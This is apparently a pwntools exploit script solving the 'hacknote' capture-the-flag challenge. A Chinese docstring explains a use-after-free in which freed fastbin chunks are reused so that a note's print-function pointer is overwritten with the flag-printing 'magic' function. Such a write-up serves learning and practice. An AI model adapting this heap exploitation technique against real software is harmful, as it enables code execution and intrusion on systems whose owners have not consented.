#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
可以看到没开多少保护，是一道简单的UAF的漏洞

在创建note的时候，malloc了两次，
第一次malloc一个8字节大小的块去存一个函数指针，用来打印出chunk的内容，
第二次malloc一个size大小的块去存note的内容

也就是一次新建note两次malloc，一次大小是8一次是输入的size

这个时候就很容易想到利用的方法了，也就是UAF----use after free
由于malloc和free的机制问题，
先被free掉的块会很快用于新的malloc（如果大小合适的话）

这里还有一个直接cat flag的函数magic，
因此我们只要想办法调用这个函数就可以搞定了

解题的思路是：

申请chunk1，大小为32（保证是fast bin范围就行），内容随意
申请chunk2，大小为32（保证是fast bin范围就行），内容随意
申请chunk3，大小为32（保证是fast bin范围就行），内容随意
free掉chunk1
free掉chunk2
此时的fast_bin的分布是这样的：
chunk2(8大小)-->-->chunk1(8大小)
chunk2(32大小)-->chunk1(32大小)

申请chunk4，大小为8，内容为magic的函数地址
申请chunk4的时候首先会申请一个8大小的空间，
这时chunk2(8大小)的空间给了这个块，
接着再申请size 大小的块，这时chunk1(8大小)的空间给了这个块
同时向chunk4中写入magic的函数地址，
也就相对应向chunk1(8大小)写入magic的函数地址，
此时原本存放puts函数指针的地方被magic函数覆盖了，
也就导致了接下来打印chunk1内容的时候会直接执行magic

打印chunk1的内容，执行magic函数
'''
from pwn import *

host = "training.pwnable.tw"
port = 11010

#r = remote(host,port)
r = process('./hacknote')

def addnote(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

# cat /home/hacknote/flag
magic = 0x08048986
#system = 0x8048506
system = 0x8048500
addnote(32,"ddaa")
addnote(32,"ddaa")
addnote(32,"ddaa")
delnote(0)
delnote(1)
addnote(8,p32(magic))
printnote(0) # use after free , 这时chunk1的printnote函数已经被magic覆盖
r.interactive()
